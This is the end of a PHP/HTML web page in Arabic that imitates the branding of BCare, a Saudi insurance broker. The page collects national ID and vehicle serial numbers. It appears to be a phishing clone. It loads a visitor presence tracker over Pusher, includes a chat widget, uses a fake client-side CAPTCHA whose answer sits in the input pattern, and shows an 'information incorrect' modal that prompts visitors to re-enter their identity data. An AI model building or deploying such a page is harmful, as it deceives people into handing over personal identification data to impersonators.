                    <img src="./assets/benfit.svg" alt="منافع تحميك">
                </div>
                <p class="feature-text">منافع تحميك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/oneWay.svg" alt="مكان واحد">
                </div>
                <p class="feature-text">مكان واحد</p>
            </div>
        </div>

        <!-- Why BCare Section -->
        <h2 class="features-title">ليش بي كير خيارك الأول في التأمين؟</h2>
        
        <div class="features-grid">
            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/saudi.svg" alt="منك وفيك">
                </div>
                <p class="feature-text">منك وفيك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/catalog.svg" alt="عروض تفهمك">
                </div>
                <p class="feature-text">عروض تفهمك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/payments_FILL0_wght400_GRAD0_opsz48.svg" alt="سعر يرضيك">
                </div>
                <p class="feature-text">سعر يرضيك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/Group 6518.svg" alt="إصدار سريع">
                </div>
                <p class="feature-text">إصدار سريع</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/tachometer-alt-fastest.svg" alt="نقسط تأمينك">
                </div>
                <p class="feature-text">نقسط تأمينك</p>
            </div>

            <div class="feature-card">
                <div class="feature-icon">
                    <img src="./assets/flame.svg" alt="نفرغ لك">
                </div>
                <p class="feature-text">نفرغ لك</p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <img src="./assets/logo-bacre-white.svg" alt="Bcare Logo" class="footer-logo">
            <p class="footer-copyright">
                2025 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين
            </p>
        </div>
    </footer>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات المدخلة غير صحيحة، يرجى التأكد من رقم الهوية أو الرقم التسلسلي والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: var(--color-primary); color: white; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/main.js"></script>
    <script src="js/presence-tracker.js"></script>
    
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id'] ?? null); ?>;

        // Set chat session ID
        document.getElementById('chat_session_id_input').value = localStorage.getItem('chat_session_id');

        // CAPTCHA Generation
        function generateCaptcha(btn = null) {
            if (btn) {
                btn.style.transform = 'rotate(180deg)';
                setTimeout(() => btn.style.transform = 'rotate(0deg)', 200);
            }
            const chars = '0123456789';
            let captcha = '';
            for (let i = 0; i < 4; i++) {
                captcha += chars[Math.floor(Math.random() * chars.length)];
            }

            document.getElementById('captchaText').innerText = captcha;
            const input = document.getElementById('captchaInput');
            input.value = '';
            input.setAttribute('pattern', captcha);

            // Draw noise lines
            const canvas = document.getElementById('captchaCanvas');
            if (canvas) {
                canvas.width = 100;
                canvas.height = 45;
                const ctx = canvas.getContext('2d');
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                for (let i = 0; i < 6; i++) {
                    ctx.beginPath();
                    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
                    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
                    ctx.strokeStyle = ['#ff0000', '#0a58ca', '#198754', '#212529'][Math.floor(Math.random() * 4)];
                    ctx.lineWidth = 1.5;
                    ctx.stroke();
                }
            }
            // Form validation update
            if (input.form) input.form.dispatchEvent(new Event('input', { bubbles: true }));
        }

        document.addEventListener('DOMContentLoaded', function() {
            generateCaptcha();

            // Refresh captcha button
            const refreshBtn = document.getElementById('refreshCaptcha');
            if (refreshBtn) {
                refreshBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    generateCaptcha(this);
                });
            }

            // Insurance type toggle
            document.querySelectorAll('.panner').forEach(radio => {
                radio.addEventListener('click', function () {
                    // إزالة active من جميع الأزرار
                    document.querySelectorAll('.panner').forEach(cont => {
                        cont.classList.remove('active');
                        cont.style.background = 'white';
                        cont.style.color = 'var(--color-text-primary)';
                    });

                    // إضافة active للزر المختار
                    this.classList.add('active');
                    this.style.background = 'var(--color-primary)';
                    this.style.color = 'white';

                    var typeTwo = document.getElementById('typeTwo');
                    if (typeTwo.style.display == 'none') {
                        typeTwo.style.display = 'block';
                        var firstType = document.getElementById('firstType');
                        firstType.value = 2;

                        document.getElementById('ssnTwo').required = true;
                    } else {
                        typeTwo.style.display = 'none';
                        var firstType = document.getElementById('firstType');
                        firstType.value = 1;
                        document.getElementById('ssnTwo').required = false;
                    }
                });
            });

            // Registration method toggle (الرقم التسلسلي / بطاقة جمركية)
            document.querySelectorAll('.pannerTwo').forEach(btn => {
                btn.addEventListener('click', function() {
                    // إزالة active من جميع الأزرار
                    document.querySelectorAll('.pannerTwo').forEach(b => {
                        b.classList.remove('active');
                    });
                    
                    // إضافة active للزر المختار
                    this.classList.add('active');
                    
                    var jama = document.getElementById('jama');
                    var tasal = document.getElementById('tasal');
                    var secondType = document.getElementById('secondType');
                    
                    if (this.id === 'ista') {
                        // الرقم التسلسلي
                        jama.style.display = 'none';
                        tasal.style.display = 'block';
                        secondType.value = 1;
                        document.getElementById('year').required = false;
                        document.getElementById('numG').required = false;
                    } else {
                        // بطاقة جمركية
                        jama.style.display = 'flex';
                        tasal.style.display = 'none';
                        secondType.value = 2;
                        document.getElementById('year').required = true;
                        document.getElementById('numG').required = true;
                    }
                });
            });

            // Form validation
            const form = document.getElementById('insuranceForm');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function () {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }

            // Show error modal if needed
            <?php if (isset($showError) && $showError): ?>
            const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
            errorModal.show();
            <?php endif; ?>
        });
    </script>

    <?php include 'chat_widget.php'; ?>
</body>
</html>